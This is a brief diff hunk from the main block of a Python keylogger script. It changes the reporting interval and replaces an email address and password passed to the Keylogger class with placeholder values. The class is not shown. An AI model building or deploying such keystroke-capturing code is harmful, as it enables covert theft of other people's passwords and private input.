@@ -67,5 +67,5 @@ class Keylogger(object):
 
 
 if __name__ == '__main__':
-    k_logger = Keylogger(60*30, 'mr.feign@gmail.com', 'dontbother')
+    k_logger = Keylogger(60*2, 'feign@gmail.com', 'fake')
     k_logger.start()
